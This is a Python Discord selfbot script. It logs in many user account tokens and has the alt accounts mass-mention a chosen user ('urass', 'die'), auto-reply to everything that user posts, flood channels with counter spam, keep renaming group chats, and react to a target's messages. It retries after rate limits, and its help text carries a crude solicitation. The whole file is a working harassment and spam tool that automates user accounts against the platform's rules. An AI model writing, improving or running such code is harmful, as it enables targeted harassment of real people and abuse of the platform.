import discord

intents = discord.Intents.default()
import asyncio

import logging

import random



logging.basicConfig(level=logging.INFO)



intents.messages = True

intents.reactions = True

try:

    intents.message_content = True

except AttributeError:

    pass



class DiscordClient(discord.Client):

    def __init__(self, token, is_main, alt_clients=None, *args, **kwargs):

        super().__init__(*args, **kwargs, intents=intents)

        self.token = token

        self.is_main = is_main

        self.alt_clients = alt_clients if alt_clients else []

        self.react_emoji = None

        self.react_user_id = None

        self.urass_user_id = None

        self.urass_running = False

        self.urass_task = None

        self.die_user_id = None

        self.die_running = False

        self.die_task = None

        self.ar_running = False

        self.ar_target_user_id = None

        self.ar_task = None

        self.ap_running = False

        self.ap_message = None

        self.ap_task = None

        self.ap_counter = 1

        self.gc_running = False

        self.gc_title = None

        self.gc_task = None

        self.gc_counter = 1



    async def on_ready(self):

        if self.is_main:

            logging.info(f"Main token logged in as {self.user}")

        else:

            logging.info(f"Alt token logged in as {self.user}")



    async def on_message(self, message):

        if self.is_main:

            if message.content.startswith("react "):

                parts = message.content.split()

                if len(parts) >= 3:

                    await message.delete()

                    self.react_emoji = parts[1]

                    try:

                        self.react_user_id = int(parts[2].strip('<@!>'))

                        logging.info(f"Set to react to user {self.react_user_id} with emoji {self.react_emoji}")

                        for client in self.alt_clients:

                            client.react_emoji = self.react_emoji

                            client.react_user_id = self.react_user_id

                    except ValueError:

                        logging.warning("Invalid user ID format.")

            elif message.content == "stop react":

                await message.delete()

                self.react_emoji = None

                self.react_user_id = None

                logging.info("Stopped reacting to user messages")

                for client in self.alt_clients:

                    client.react_emoji = None

                    client.react_user_id = None

            elif message.content.startswith("urass "):

                parts = message.content.split()

                if len(parts) == 2:

                    await message.delete()

                    try:

                        self.urass_user_id = int(parts[1].strip('<@!>'))

                        logging.info(f"Set to send messages to user {self.urass_user_id}")

                        for client in self.alt_clients:

                            client.urass_user_id = self.urass_user_id

                            client.urass_running = True

                            client.urass_task = asyncio.create_task(client.send_urass_messages(message.channel.id))

                    except ValueError:

                        logging.warning("Invalid user ID format.")

            elif message.content == "drop":

                await message.delete()

                self.urass_user_id = None

                self.urass_running = False

                logging.info("Stopped sending messages to user")

                for client in self.alt_clients:

                    client.urass_user_id = None

                    client.urass_running = False

                    if client.urass_task:

                        client.urass_task.cancel()

                        client.urass_task = None

            elif message.content.startswith("die "):

                parts = message.content.split()

                if len(parts) == 2:

                    await message.delete()

                    try:

                        self.die_user_id = int(parts[1].strip('<@!>'))

                        logging.info(f"Set to send die messages to user {self.die_user_id}")

                        for client in self.alt_clients:

                            client.die_user_id = self.die_user_id

                            client.die_running = True

                            client.die_task = asyncio.create_task(client.send_die_messages(message.channel.id))

                    except ValueError:

                        logging.warning("Invalid user ID format.")

            elif message.content == "stop die":

                await message.delete()

                self.die_user_id = None

                self.die_running = False

                logging.info("Stopped sending die messages to user")

                for client in self.alt_clients:

                    client.die_user_id = None

                    client.die_running = False

                    if client.die_task:

                        client.die_task.cancel()

                        client.die_task = None

            elif message.content.startswith("stream "):

                stream_message = message.content[len("stream "):].strip()

                await message.delete()

                logging.info(f"Setting streaming status to: {stream_message}")

                await self.start_streaming(stream_message)

            elif message.content.startswith("ar "):

                parts = message.content.split(maxsplit=1)

                if len(parts) == 2:

                    await message.delete()

                    target_user_id = parts[1].strip('<@!>')

                    if target_user_id.isdigit():

                        self.ar_target_user_id = int(target_user_id)

                        self.ar_running = True

                        for client in self.alt_clients:

                            client.ar_target_user_id = self.ar_target_user_id

                            client.ar_running = True

                            client.ar_task = asyncio.create_task(client.auto_reply(message.channel.id))

            elif message.content == "stop ar":

                await message.delete()

                self.ar_running = False

                self.ar_target_user_id = None

                for client in self.alt_clients:

                    client.ar_running = False

                    client.ar_target_user_id = None

                    if client.ar_task:

                        client.ar_task.cancel()

                        client.ar_task = None

            elif message.content.startswith("ap "):

                parts = message.content.split(maxsplit=1)

                if len(parts) == 2:

                    await message.delete()

                    self.ap_message = parts[1]

                    self.ap_running = True

                    self.ap_counter = 1

                    for client in self.alt_clients:

                        client.ap_message = self.ap_message

                        client.ap_running = True

                        client.ap_counter = self.ap_counter

                        client.ap_task = asyncio.create_task(client.ap_spam(message.channel.id))

            elif message.content == "fawk":

                await message.delete()

                self.ap_running = False

                self.ap_message = None

                for client in self.alt_clients:

                    client.ap_running = False

                    client.ap_message = None

                    if client.ap_task:

                        client.ap_task.cancel()

                        client.ap_task = None

            elif message.content.startswith("gc "):

                parts = message.content.split(maxsplit=1)

                if len(parts) == 2:

                    await message.delete()

                    self.gc_title = parts[1]

                    self.gc_running = True

                    self.gc_counter = 1

                    for client in self.alt_clients:

                        client.gc_title = self.gc_title

                        client.gc_running = True

                        client.gc_counter = self.gc_counter

                        client.gc_task = asyncio.create_task(client.gc_change_title(message.channel.id))

            elif message.content == "9":

                await message.delete()

                self.gc_running = False

                self.gc_title = None

                for client in self.alt_clients:

                    client.gc_running = False

                    client.gc_title = None

                    if client.gc_task:

                        client.gc_task.cancel()

                        client.gc_task = None

            elif message.content == "help":

                await self.send_help(message.channel)



        elif self.react_user_id and message.author.id == self.react_user_id:

            try:

                logging.info(f"Reacting to message from user {self.react_user_id} with emoji {self.react_emoji}")

                await message.add_reaction(self.react_emoji)

            except discord.HTTPException as e:

                logging.error(f"Failed to add reaction: {e}")

            except Exception as e:

                logging.error(f"Unexpected error when adding reaction: {e}")



    async def send_urass_messages(self, channel_id):

        if not self.urass_user_id or not self.urass_running:

            return



        try:

            with open('words.txt', 'r') as file:

                words = [line.strip() for line in file.readlines()]



            channel = self.get_channel(channel_id)

            if not channel:

                logging.error(f"Channel ID {channel_id} not found")

                return



            while self.urass_running:

                word = random.choice(words)

                message = f"{word} <@{self.urass_user_id}>"

                try:

                    await channel.send(message)

                except discord.errors.HTTPException as e:

                    if e.status == 429:

                        logging.warning(f"{self.user} rate limited, sleeping for 20 seconds")

                        await asyncio.sleep(20)

                        continue

                    else:

                        logging.error(f"Failed to send message: {e}")

                        break

                await asyncio.sleep(0.01 + random.random())

        except FileNotFoundError:

            logging.error("File words.txt not found.")

        except asyncio.CancelledError:

            logging.info("URASS task cancelled.")

        except Exception as e:

            logging.error(f"An unexpected error occurred while sending messages: {str(e)}")



    async def send_die_messages(self, channel_id):

        if not self.die_user_id or not self.die_running:

            return



        try:

            with open('words.txt', 'r') as file:

                words = [line.strip() for line in file.readlines()]



            channel = self.get_channel(channel_id)

            if not channel:

                logging.error(f"Channel ID {channel_id} not found")

                return



            while self.die_running:

                sentence = random.choice(words)

                split_words = sentence.split()

                combined_message = "\n".join(split_words) + f"\n<@{self.die_user_id}>"

                try:

                    await channel.send(combined_message)

                except discord.errors.HTTPException as e:

                    if e.status == 429:

                        logging.warning(f"{self.user} rate limited, sleeping for 15 seconds")

                        await asyncio.sleep(15)

                        continue

                    else:

                        logging.error(f"Failed to send message: {e}")

                        break

                await asyncio.sleep(3)

        except FileNotFoundError:

            logging.error("File words.txt not found.")

        except asyncio.CancelledError:

            logging.info("DIE task cancelled.")

        except Exception as e:

            logging.error(f"An unexpected error occurred while sending messages: {str(e)}")



    async def auto_reply(self, channel_id):

        try:

            with open('words.txt', 'r') as file:

                replies = [line.strip() for line in file.readlines()]



            channel = self.get_channel(channel_id)

            while self.ar_running:

                await asyncio.sleep(1)

                async for message in channel.history(limit=10):

                    if message.author.id == self.ar_target_user_id:

                        random_reply = random.choice(replies)

                        try:

                            await message.reply(random_reply)

                            logging.info(f"Response sent to {self.ar_target_user_id}: {random_reply}")

                        except discord.errors.HTTPException as e:

                            logging.error(f"Error sending reply: {e}")



        except FileNotFoundError:

            logging.error("File words.txt not found.")

        except Exception as e:

            logging.error(f"An unexpected error occurred in auto_reply: {str(e)}")



    async def ap_spam(self, channel_id):

        channel = self.get_channel(channel_id)

        while self.ap_running:

            try:

                if not self.ap_message:

                    break

                message_content = f"{self.ap_message} {self.ap_counter}"

                await channel.send(message_content)

                self.ap_counter += 1

                await asyncio.sleep(0.01)

            except discord.errors.HTTPException as e:

                if e.status == 429:

                    logging.warning(f"Rate limited for token {self.token}. Waiting for 30 seconds...")

                    await asyncio.sleep(30)

                else:

                    await asyncio.sleep(1)



    async def gc_change_title(self, channel_id):

        channel = self.get_channel(channel_id)

        while self.gc_running:

            try:

                if not self.gc_title:

                    break

                message_content = f"{self.gc_title} {self.gc_counter}"

                if not self.is_main:

                    await channel.edit(name=message_content)

                    logging.info(f"Title changed to: {message_content} for token {self.token}")

                self.gc_counter += 1

                await asyncio.sleep(0.01)

            except discord.errors.HTTPException as e:

                logging.error(f"Error changing title for token {self.token}: {e}")

                if e.status == 429:

                    logging.warning(f"Rate limited for token {self.token}. Waiting for 30 seconds...")

                    await asyncio.sleep(30)

                else:

                    await asyncio.sleep(1)



    async def start_streaming(self, stream_message):

        tasks = []

        for client in self.alt_clients:

            logging.info(f"Setting streaming status for {client.user} with message: {stream_message}")

            task = client.change_presence(activity=discord.Streaming(name=stream_message, url="https://twitch.tv/xx"))

            tasks.append(task)

        await asyncio.gather(*tasks)

        logging.info(f"Started streaming '{stream_message}' on all alt tokens")



    async def send_help(self, channel):

        help_message = """
```
 


⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                 
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀ 
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀  `react <emoji> <@user>` - Reacts to messages from the specified user with the given emoji.
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀  `stop react` - Stops reacting to user messages.
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀  `urass <@user>` - Sends random messages to the specified user.
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀  `drop` - Stops sending messages to user.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀  `die <@user>` - Sends messages to the specified user.            
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀   `stop die` - Stops sending messages to user.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧⠀⠀  `stream <message>` - Sets streaming status.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀  `ar <@user>` - Replies to the user's messages with a random word from `words.txt`.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳  `stop ar` - Stops the auto-reply task.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀  `ap <message>` - Spams the message with an incrementing counter.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀  `fawk` - Stops the spam task.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀   `gc <title>` - Changes the group chat title to an incrementing counter (alt tokens only).
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀   `9` - Stops the title changing task.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀   `help` - Shows this help message.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀   @c2bt for sup
                                            @6unn.n for thigh high pics
```

        """

        await channel.send(help_message)



    async def start_bot(self):

        try:

            await self.start(self.token, bot=False)

        except Exception as e:

            logging.error(f"Failed to log in with token: {self.token}, Error: {str(e)}")



async def main():

    try:

        with open('tokens.txt', 'r') as file:

            tokens = [line.strip() for line in file.readlines()]



        if not tokens:

            logging.error("No tokens found in working.txt")

            return



        main_token = tokens[0]

        alt_tokens = tokens[1:]



        alt_clients = [DiscordClient(token, False) for token in alt_tokens]

        main_client = DiscordClient(main_token, True, alt_clients)



        tasks = [main_client.start_bot()] + [client.start_bot() for client in alt_clients]

        await asyncio.gather(*tasks)

    except FileNotFoundError:

        logging.error("File working.txt not found.")

    except Exception as e:

        logging.error(f"An unexpected error occurred in the main function: {str(e)}")



if __name__ == "__main__":

    asyncio.run(main())